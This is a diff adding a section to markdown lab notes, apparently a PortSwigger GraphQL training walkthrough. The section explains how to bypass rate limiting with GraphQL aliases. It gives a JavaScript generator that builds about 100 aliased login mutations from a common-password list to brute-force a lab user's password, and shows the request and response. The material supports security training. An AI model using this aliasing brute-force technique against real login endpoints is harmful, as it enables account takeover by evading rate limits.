@@ -501,4 +501,115 @@ In Repeater, change to GraphQL tab and edit `id` variable and set it to `3`. Sen
 
 > NOTE: Check out [walkthrough](graphql_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## Bypassing rate limiting using aliases
+
+Normally, GraphQL objects aren't allowed to have multiple fields with the same name. However, by using __aliases__, you can work around this limitation by assigning unique names to each field you want the API to return. This allows you to request several instances of the same object type with a single query. 
+
+Although aliases are mainly designed to reduce the number of API calls needed, they can also be exploited to __burte force__ a GraphQL endpoint.
+
+In many cases, endpoints are protected by rate limiters that restrict the number of incoming HTTP requests. However, since aliases let you bundle multiple queries into one HTTP request, they can be used to bypass these rate-limiting protections.
+
+### Bypassing rate limiting using aliases - Continued
+
+The example below demonstrates how aliased queries can be used to check multiple store sicount codes within a single request. Although it's only one HTTP request, it could still be used to validate a large number of discount codes at once, potentially bypassing rate-limiting protections. 
+
+```graphql
+# Request using aliased queries
+
+query isValidDiscount($code: Int) {
+    isvalidDiscount(code: $code) {
+        valid
+    }
+    isValidDiscount2: isValidDiscount(code: $code) {
+        valid
+    }
+    isValidDiscount3: isValidDiscount(code: $code) {
+        valid
+    }
+}
+```
+
+### Lab: Bypassing GraphQL brute force protections
+
+In Burp's browser go to "My account" and attempt a login with `admin:admin`. Go to __Proxy__ > __HTTP history__ and notice that login requests are sending as `POST /graphql/v1` GraphQL mutations:
+
+```graphql
+{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"admin","password":"admin"}}}
+```
+
+Send that request to __Repeater__. Press send a couple of times, until it returns an error:
+
+```json
+{
+  "errors": [
+    {
+      "path": [
+        "login"
+      ],
+      "extensions": {
+        "message": "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+      },
+      "locations": [
+        {
+          "line": 3,
+          "column": 9
+        }
+      ],
+      "message": "Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+    }
+  ],
+  "data": {
+    "login": null
+  }
+}
+```
+
+In __Repeater__ navigate to __GraphQL__ tab on the Request panel and craft a request that uses aliases to send multiple login mutations in one message. In the Tip section an example JavaScript is provided to generate aliases:
+
+```javascript
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+```
+
+The tip suggests to open a browser console, paste it there and it will be copied to your clipboard. In the __GraphQL__ tab in Repeater's Request panel add it to the GraphQL query, like this:
+
+```graphql
+mutation login($input: LoginInput!) {
+        login(input: $input) {
+            token
+            success
+        }
+    	bruteforce0:login(input:{password: "123456", username: "carlos"}) {
+			token
+			success
+		}
+        ....
+        ....
+        ....
+        bruteforce99:login(input:{password: "moscow", username: "carlos"}) {
+			token
+			success
+		}
+}
+```
+
+So essentially, within the `mutation {}` type. That way it will try 99 mutation requests with username `carlos` and different passwords. 
+
+In the response there's a result for each given alias. Go through them and find, which one has `success` set to `true` in the response:
+
+```json
+   "bruteforce55": {
+      "token": "sab8DMdoz8yvUISLAOCcLL1BaUZId78l",
+      "success": true
+    },
+```
+
+Check which password was used in the alias `bruteforce55`, log in as `carlos` with that password to solve the lab. 
+
+> NOTE: Check out [walkthrough](graphql_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
 
